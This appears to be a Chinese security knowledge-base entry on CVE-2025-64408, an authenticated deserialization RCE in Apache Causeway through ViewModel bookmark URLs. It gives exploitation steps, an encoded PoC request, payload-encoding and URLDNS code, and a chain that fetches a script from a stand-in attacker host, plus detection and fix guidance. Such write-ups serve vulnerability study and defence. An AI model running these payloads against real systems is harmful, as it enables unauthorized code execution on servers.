---
id: web-java-deserialization-causeway-viewmodel-bookmark-memento-rce
title: Apache Causeway ViewModel Bookmark memento 反序列化 RCE：URL 片段经 GZip+Base64 还原对象（CVE-2025-64408）
type: scenario
domain: web
path: web/java/deserialization
technique: causeway-viewmodel-bookmark-memento-deserialization
tags:
- java
- deserialization
- apache-causeway
- viewmodel
- bookmark
- memento
- wicket
- rce
- cve-2025-64408
cve:
- CVE-2025-64408
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: Apache Causeway [2.0.0, 3.5.0)（最小修复 3.5.0）；[4.0.0-M1, 4.0.0-M1]（原文称暂无修复）
verification:
  verified_by: verifier-V51
  verified_at: '2026-11-05T09:06:51+08:00'
  notes: 已通读原文并逐张核对12张图：图01 advisory 确认 CVE-2025-64408、CVSS 8.8 PR:L、[2.0.0,3.5.0) 修复 3.5.0、[4.0.0-M1,4.0.0-M1] 暂无修复；图02/03/04 确认 _MementoDefault.parse readObject、parseMemento、Bookmark 冒号分割；图07/08 确认 /wicket/object/ URL 与 GZip+URL-Safe Base64；图09/10 确认 /tmp/n1es.txt 写入；图11/12 确认依赖缺失与 URLDNS。卡内 affected_versions 与 advisory 一致。未验证点：未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/java/deserialization/web-java-deserialization-causeway-viewmodel-bookmark-memento-rce/
draft: false
kb_aliases:
- CVE-2025-64408
- Apache Causeway 反序列化
- ViewModel bookmark RCE
- _MementoDefault readObject
- Bookmark identifier 反序列化
- HmacAuthority 修复
- CAUSEWAY-3939
---

## 一句话结论

Apache Causeway 在处理 ViewModel 书签时，把 URL 中 `logicalTypeName:identifier` 的 `identifier` 经 URL-Safe Base64 + GZip 解码后直接交给 `ObjectInputStream.readObject()`，且没有签名/完整性校验；经过身份认证的攻击者构造 `/wicket/object/<logicalTypeName>:<压缩Base64序列化数据>` 即可在存在 gadget 的 classpath 下触发反序列化 RCE（CVE-2025-64408，CVSS 8.8）。

## 原理

- 入口：ViewModel 页面 URL（文章为 `/wicket/object/...`）中的 bookmark 字符串被 `Bookmark.parse` 解析：`StringTokenizer(str, ":")` 分成 `logicalTypeName` 与 `urlSafeIdentifier`。
- 类型解析：`SpecificationLoaderDefault#lookupLogicalType(logicalTypeName)` 先在 `logicalTypeResolver` 查找，找不到再 `loadClass(logicalTypeName)`，因此逻辑类型名可指向可加载的类。
- 还原链路：`ViewModelFacetForJavaRecord#parseMemento(bookmark)` → `_Mementos.parse(codec, serializer, bookmark.identifier())` → `_MementoDefault.parse(...)`。
- 危险 sink：`_MementoDefault.parse` 中 `ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(codec.decode(str))); HashMap<String, Serializable> valuesByKey = (HashMap) ois.readObject();`，直接反序列化客户端可控字节；`resolveClass` 被重写为 `Class.forName(name, false, _Context.getDefaultClassLoader())`，没有类白名单/过滤器。
- 编码：`UrlEncodingServiceWithCompression#decode` 对字符串做 URL-Safe Base64 解码后再 GZip 解压；因此 payload 需先 GZip 压缩再 URL-Safe Base64 编码（文章给出 `asCompressedUrlBase64`/`ofCompressedUrlBase64` 实现，短于 18 字节不压缩，18–255 字节前缀 0x00，≥256 字节前缀 0x01 + gzip）。
- 利用：文章用 AspectJWeaver 链（`SimpleCache$StoreableCachingMap` + `LazyMap` + `TiedMapEntry` + `ConstantTransformer`）在 `/tmp` 写 `n1es.txt` 并 `cat` 验证；JDK 17+ 下 `TemplatesImpl` 等被模块系统限制，可改用 DBCP2 + H2 JDBC `INIT=RUNSCRIPT FROM 'http://attacker/evil.sql'` 等不依赖 JDK 内部类的链；URLDNS 链仅依赖 JDK 核心类，可用于无回显的存在性验证。
- 前提：需要经过身份认证（advisory PR:L）；Causeway 默认用 JDK 21，传统 TemplatesImpl 链受限，实际利用需按 classpath 选择 gadget。

## 触发条件

- 目标为受影响版本的 Apache Causeway（[2.0.0,3.5.0)，或 4.0.0-M1）。
- 攻击者拥有一个有效账号（认证后可达 ViewModel 页面/URL）。
- 目标 classpath 存在可用 gadget（AspectJWeaver、CommonsCollections、DBCP2/H2 等）或可用 JDBC 链。
- ViewModel 书签 URL 未被反向代理/WAF 拦截，且 `logicalTypeName` 可解析到目标 ViewModel 类。

## 利用步骤

1. 登录目标 Causeway 应用，进入任意 ViewModel 页面，观察 URL 形如 `/wicket/object/<logicalTypeName>:<identifier>`。
2. 选择可用的 `logicalTypeName`（如 `causeway.conf.ConfigurationViewmodel`，或目标应用中的 ViewModel 类）。
3. 用目标 classpath 可用的 gadget 生成序列化字节（文章示例：AspectJWeaver `StoreableCachingMap` 写文件；高版本 JDK 可用 DBCP2+H2 JDBC INIT）。
4. 先 GZip 压缩，再做 URL-Safe Base64 编码，拼成 `logicalTypeName:payload` 放入 `/wicket/object/` 路径。
5. 发送请求；服务端解析 bookmark → 解码 → `readObject()` 触发 gadget。文章用 `/tmp/n1es.txt` 写入并 `cat` 验证。
6. 无回显环境先用 URLDNS 链确认反序列化触发，再换命令执行链。

## PoC

```text
GET /wicket/object/causeway.conf.ConfigurationViewmodel:AR-LCAAAAAAAAP-FkjFvEzEUx1_vlDRFFaSogpEOlTogbCHBgIKgtKJq0QFDMiCx4CZO7oLPNvZLeunAwMiEUKYiIT5AqeAjVBUfAEZgQEIdmVg68nyhUhFDT7q7Z7_n__vZf-_-gop3MNcXQ8EGmCm2Lnx6X9jK9Nf9gwtPPscQrcEZZURnTbTRuA2YwdRJnxrVKeztZQjP7FaNvnV6p0jsunE9Jqxop5K1TZ4b7emvlGxjRvE19lSOhkINJGtlskO97mp0o5fvv7y5sX_pWwRRAjGVIJxPAhZXQvf4w80-rW9QKhcW4dwkFYg5KTQKmqvpq9IzLJAYLp_GQCosEdsjWqwPxy_ejurjGKYSmO6W26TuVxLS4BMN_leDn9TgLSe07xqXS0cA1PXmaV27Ax3UPVulIQqNJyQeDV_N3Yk-jqOAMZMdVzyD5xAXduAgeryy-_viUbXW-hE
Host: target.example:8080
Cookie: <已认证会话>
```

```text
# 预期：服务端反序列化并执行 gadget；文章用 AspectJWeaver 链在 /tmp/n1es.txt 写入 "n1es is here"，
# 随后 cat /tmp/n1es.txt 输出该内容。
```

```java
// payload 编码要点（文章 CausewayBase64Utils）
byte[] bytes = writeObjectToBytes(gadgetMap);
byte[] encoded = CausewayBase64Utils.asCompressedUrlBase64.apply(bytes); // gzip + URL-safe base64
String url = "/wicket/object/" + logicalTypeName + ":" + new String(encoded);
```

```java
// 无回显验证：URLDNS（仅依赖 JDK 核心类）
HashMap map = new HashMap();
URL url = new URL("http://<dnslog-domain>");
Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
f.setAccessible(true); f.set(url, 1); map.put(url, 123); f.set(url, -1);
byte[] bytes = writeObjectToBytes(map);
```

## 变体与关联

- 变体：gadget 选择——AspectJWeaver `StoreableCachingMap`、CommonsCollections LazyMap/TiedMapEntry、DBCP2+H2 JDBC `INIT=RUNSCRIPT`、URLDNS 探测。
- 变体：`logicalTypeName` 可换目标应用中任意可加载的 ViewModel/类名；`identifier` 的压缩前缀规则（0x00/0x01）需与 `UrlEncodingServiceWithCompression` 对齐。
- 关联：[[web-java-deserialization-jndi-ldap-local-factory-h2-init-rce]]（H2 JDBC INIT 链，高版本 JDK 替代方案）；[[web-java-deserialization-jdk-urldns-dns-probe]]（URLDNS 探测）；[[web-java-deser-jdk-xslt-process-main-chain]]（TemplatesImpl 传统链）。
- 边界：文章在 Causeway 3.2.0 / JDK 22 环境验证了 AspectJWeaver 写文件与 URLDNS；实际目标需有对应 gadget，且需要认证。advisory 影响范围含 [2.0.0,3.5.0) 与 4.0.0-M1。

## 检测与防御

- 检测：审计 Causeway ViewModel bookmark/memento 的反序列化路径；监控 `/wicket/object/` URL 中 `:` 后超长 Base64/GZip 数据；关注 `ObjectInputStream.readObject` 调用栈来自 `_MementoDefault`；监控异常反序列化类加载与 `/tmp` 可疑文件。
- 修复：升级到 3.5.0 或更高（4.0.0-M1 无修复，需迁移）；修复版为 bookmark/memento 引入 HMAC 签名与验签，反序列化前强制校验，失败即终止。
- 加固：反序列化使用类白名单/ObjectInputFilter；禁止不可信数据进入 `readObject`；限制应用出站与文件写权限；WAF 拦截 `/wicket/object/` 中的序列化特征。
